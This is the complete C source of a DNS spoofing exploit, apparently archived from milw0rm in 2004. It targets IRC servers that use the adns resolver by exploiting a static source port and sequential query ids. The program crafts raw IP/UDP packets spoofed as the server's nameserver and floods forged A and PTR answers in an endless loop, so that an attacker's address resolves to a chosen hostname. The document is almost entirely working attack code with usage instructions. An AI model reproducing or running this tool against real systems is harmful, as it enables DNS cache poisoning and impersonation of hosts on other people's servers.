<html><head><title>ADNS Remote DNS Cache Poisoning Flaw Exploit (spoof on ircd)</title></head><pre>/* adns_spoof.c - sloth@nopninjas.com - August 2004
 *   - spoof dns on ircd's using the adns code
 *
 *   Dedicated to #loldongs @ efnet
 *     http://picdump.home.mindspring.com/dns/
 *     http://www.loldongs.com
 *     the comic about how dns works (or doesn't work)
 *
 *   - spoof dns on anything using the adns (asynchronous dns resolver) code
 *
 *   - The bug:
 *       - Static source port used by the adns code
 *       - Sequential DNS ids in request packets
 *
 *   - Initiate sequence to trigger a dns lookup by the adns resolver. Send
 *     the same range of spoofed DNS ids in a constant flood spoofed as the
 *     primary DNS server for the host. Even a local DNS request will take
 *     long enough to allow some amount of the spoofed DNS responses through
 *     before the primary DNS responds. Since the resolver does not cache
 *     results, the dns lookups can be triggered until the DNS id is
 *     incremented within the DNS id range being spoofed.
 *
 *   NOT FINISHED YET
 */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;time.h&gt;

#ifndef u8
  #define u8  unsigned char
#endif

#ifndef u16
  #define u16 unsigned short
#endif

#ifndef u32
  #define u32 unsigned long
#endif


struct dns_header {
  u16 id;
  u16 flags;
  u16 questions;
  u16 answer_rr;
  u16 auth_rr;
  u16 extra_rr;
} __attribute__((packed));

struct dns_data {
  u16 name;
  u16 type;
  u16 class;
  u16 ttlh;
  u16 ttl;
  u16 data_len; /* data len - sizeof(char *) */
  char *data;
  /* data */
} __attribute__((packed));

struct dns_packet {
  size_t len;
  u8  type;
  char *data;
  /* packet data */
};

struct dns_query {
  size_t len;
  char *data;
};

struct ip_header {
  u8  ihl:4,
      version:4;
  u8  tos;
  u16 tot_len;
  u16 id;
  u16 frag_off;
  u8  ttl;
  u8  protocol;
  u16 check;
  u32 saddr;
  u32 daddr;
};

struct udp_header {
  u16 source;
  u16 dest;
  u16 len;
  u16 check;
};

#define DNS_A   0x0001
#define DNS_PTR 0x000c

struct udp_packet {
  struct ip_header iph;
  struct udp_header udph;
};

void usage() {
  fprintf(stderr, &quot;usage: ./adns_spoof &lt;ircd ip&gt; &lt;ircd dns port&gt; &lt;ircd dns ip&gt; &quot;
                  &quot;&lt;your ip&gt; &lt;spoof host&gt; &lt;dns id&gt;\n&quot;);
  exit(-1);
}

void fatal(char *reason) {
  fprintf(stderr, &quot;fatal: %s\n&quot;, reason);
  exit(-1);
}

unsigned short csum(unsigned short *addr, int len) {
  register int sum = 0;
  u_short answer = 0;
  register u_short *w = addr;
  register int nleft = len;

  while (nleft &gt; 1)  {
    sum += *w++;
    nleft -= 2;
  }

  if (nleft == 1) {
    *(u_char *)(&amp;answer) = *(u_char *)w ;
    sum += answer;
  }

  sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
  sum += (sum &gt;&gt; 16);
  answer = ~sum;
  return(answer); /* return the checksum value. */
}

struct udp_packet *alloc_packet(size_t datalen) {
  struct udp_packet *packet;
  struct ip_header  *iph;
  struct udp_header *udph;

  if(!(packet = calloc(1, sizeof(struct udp_packet) + datalen)))
    fatal(&quot;error: allocating udp packet&quot;);

  iph  = &amp;packet-&gt;iph;
  udph = &amp;packet-&gt;udph;

  iph-&gt;ihl       = 5;
  iph-&gt;version   = 4;
  iph-&gt;tos       = 0;
  iph-&gt;tot_len   = sizeof(struct udp_packet) + datalen;
  iph-&gt;id        = htonl(0xbeef);
  iph-&gt;frag_off  = 0;
  iph-&gt;ttl       = 255;

  iph-&gt;protocol  = 17;

  udph-&gt;len      = htons(sizeof(struct udp_header) + datalen);

  return(packet);
}

void init_packet(long source, int sport, long dest, int port,
                 struct udp_packet *udp_packet,
                 struct dns_packet *dns_packet) {
  struct ip_header *iph;
  struct udp_header *udph;
  char *data;

  iph  = &amp;udp_packet-&gt;iph;
  udph = &amp;udp_packet-&gt;udph;

  iph-&gt;saddr      = source;
  iph-&gt;daddr      = dest;
  iph-&gt;check      = csum((unsigned short *)iph, sizeof(struct ip_header));

  udph-&gt;check  = 0;
  udph-&gt;source = htons(sport);
  udph-&gt;dest   = htons(port);

  data = (char *)udp_packet + sizeof(struct udp_packet);
  memcpy(data, &amp;dns_packet-&gt;data, dns_packet-&gt;len);
}

char *dns_string_format(char *out, char *in) {
  int i, x;

  for(i = strlen(in) - 1, x = 0; i &gt; -1; i--, x++) {
    if(in[i] == '.') {
      out[i] = x;
      x = -1;
    } else
      out[i] = in[i];
  }

  out[i] = x;

  return(out);
}

struct dns_packet *alloc_dns_packet(char *query_data, size_t qlen,
                                    char *answer_data, int type) {
  struct dns_packet *dns_packet;
  struct dns_header *dns_header;
  struct dns_data *dns_data;
  char *query,
       *answer;
  size_t totlen,
         alen;
 
  if(type == DNS_A)
    alen = 4;
  else
    alen = strlen(answer_data);

  totlen = sizeof(struct dns_header) +
           qlen +
           sizeof(struct dns_data) - sizeof(char *) + alen +
           ((type == DNS_A) ? 0 : 2);

  if((dns_packet = calloc(1, totlen + sizeof(size_t) + 1 +
                          sizeof(char *))) == NULL)
    fatal(&quot;failed alloc&quot;);

  dns_packet-&gt;len      = totlen;
 
  dns_header = (struct dns_header *) &amp;dns_packet-&gt;data;
  query      =              (char *) &amp;dns_packet-&gt;data +
                                     sizeof(struct dns_header);
  dns_data   =   (struct dns_data *) (query + qlen);
  answer     =              (char *) &amp;dns_data-&gt;data +
                                     ((type == DNS_A) ? 0 : 1);


  dns_header-&gt;flags     = htons(0x8180);
  dns_header-&gt;questions = htons(1);
  dns_header-&gt;answer_rr = htons(1);
  dns_header-&gt;auth_rr   = htons(0);
  dns_header-&gt;extra_rr  = htons(0);


  memcpy(query, query_data, qlen);

  dns_data-&gt;name        = htons(0xc00c);
  dns_data-&gt;type        = htons(type);
  dns_data-&gt;class       = htons(1);
  dns_data-&gt;ttl         = htons(300);

  dns_data-&gt;data_len    = htons(alen + ((type == DNS_A) ? 0 : 1));

  if(type == DNS_A)
    memcpy(answer, &amp;answer_data, 4);
  else
    dns_string_format(answer, answer_data);

  return(dns_packet);
}

struct dns_query *alloc_dns_query(char *query, int qtype) {
  struct dns_query *dns_query;
  size_t qlen;
  int i, x = 0;
  char *p;
  char *data;
  u16  *type,
       *class;

  qlen = 1 + strlen(query) + 1 + 2 + 2;

  if((dns_query = (struct dns_query *)calloc(1, sizeof(size_t) + qlen)) == NULL)
    fatal(&quot;fatal alloc\n&quot;);

  dns_query-&gt;len = qlen;

  data   = (char *) &amp;dns_query-&gt;data + 1;
  type   =  (u16 *) (data + strlen(query) + 1);
  class  =  (u16 *) type + 1;

  dns_string_format(data, query);

  *type   = htons(qtype);
  *class  = htons(1);

  return(dns_query);
};

int send_packet(struct in_addr src, u16 sport,
                struct in_addr dst, u16 dport,
                struct udp_packet *udp_packet,
                struct dns_packet *dns_packet, u32 dns_id) {
  struct sockaddr_in sin;
  struct dns_header *dns_header;
  int s, olen;
unsigned char *p;
int i;

  dns_header     = (struct dns_header *) &amp;dns_packet-&gt;data;
  dns_header-&gt;id = htons(dns_id);

  init_packet(src.s_addr, sport, dst.s_addr, dport, udp_packet, dns_packet);

  sin.sin_family      = AF_INET;
  sin.sin_addr        = dst;
  sin.sin_port        = htons(sport);

  if((s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) &lt; 0) {
    fprintf(stderr, &quot;%s: ERROR send_packet() -&gt; socket()\n&quot;, inet_ntoa(dst));
    return(s);
  }

  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &amp;olen, sizeof(olen)) &lt; 0)
    fprintf(stderr, &quot;ERROR: could not set socket option IP_HDRINCL.\n&quot;);

  while(sendto(s, udp_packet, sizeof(struct udp_packet) + dns_packet-&gt;len, 0,
       (struct sockaddr *)&amp;sin, sizeof(sin)) &lt; 0) {

    if(errno == ENOBUFS)
      usleep(50);
    else {
      fprintf(stderr, &quot;%s: send_packet() -&gt; sendto() [%d]\n&quot;, inet_ntoa(dst), errno);
      close(s);
      return(-1);
    }

  }

  close(s);

}

void do_spoof(struct in_addr src, u16 sport,
              struct in_addr dst, u16 dport,
              struct in_addr me, char *answer, u16 dns_id) {
  struct udp_packet *udp_packet_A,
                    *udp_packet_PTR;
  struct dns_packet *dns_packet_A,
                    *dns_packet_PTR;
  struct dns_query  *dns_query_A,
                    *dns_query_PTR;
  char query[255];
  int i;

printf(&quot;dns_id = %d\n&quot;, dns_id);

  snprintf(query, sizeof(query) - 1,
           &quot;%d.%d.%d.%d.in-addr.arpa&quot;,
           (me.s_addr &gt;&gt; 24),
           (me.s_addr &gt;&gt; 16) &amp; 0xff,
           (me.s_addr &gt;&gt;  8) &amp; 0xff,
           (me.s_addr      ) &amp; 0xff);

  dns_query_A    = alloc_dns_query(answer, DNS_A);
  dns_packet_A   = alloc_dns_packet((char *)&amp;dns_query_A-&gt;data,
                                    dns_query_A-&gt;len,
                                    (char *)me.s_addr, DNS_A);
  udp_packet_A   = alloc_packet(dns_packet_A-&gt;len);


  dns_query_PTR  = alloc_dns_query(query, DNS_PTR);
  dns_packet_PTR = alloc_dns_packet((char *)&amp;dns_query_PTR-&gt;data,
                                    dns_query_PTR-&gt;len, answer, DNS_PTR);
  udp_packet_PTR = alloc_packet(dns_packet_PTR-&gt;len);

  /* weee flood time */
  for(i = 0; ; i++) {
    send_packet(src, sport, dst, dport, udp_packet_A, dns_packet_A, dns_id + i);
    send_packet(src, sport, dst, dport, udp_packet_PTR, dns_packet_PTR, dns_id + i);
    usleep(50);

    if(i &gt; 3)
      i = 0;
  }
}

long resolve(char *host) {
  struct in_addr ip;
  struct hostent *he;

  if((ip.s_addr = inet_addr(host)) == -1) {
    if(!(he = gethostbyname(host)))
      return(-1);
    else
      memcpy(&amp;ip.s_addr, he-&gt;h_addr, 4);
  }
  return(ip.s_addr);
}

int main(int argc, char *argv[]) {
  int i, dns_port, dns_id;
  struct in_addr ircd,
                 ircd_ns,
                 me;
  char *spoof_host;

  printf(&quot;###### adns_spoof1.c - sloth@nopninjas.com ######\n&quot;);

  if(argc &lt; 6)
    usage();

  if((ircd.s_addr = resolve(argv[1])) == -1)
    fatal(&quot;ircd host invalid&quot;);

  dns_port = atoi(argv[2]);

  if((ircd_ns.s_addr = resolve(argv[3])) == -1)
    fatal(&quot;ircd dns host invalid&quot;);

  if((me.s_addr = resolve(argv[4])) == -1)
    fatal(&quot;my host invalid&quot;);

  spoof_host    = argv[5];
  dns_id        = atoi(argv[6]);

  do_spoof(ircd_ns, 53, ircd, dns_port, me, spoof_host, dns_id);

}

// milw0rm.com [2004-08-01]</pre></html>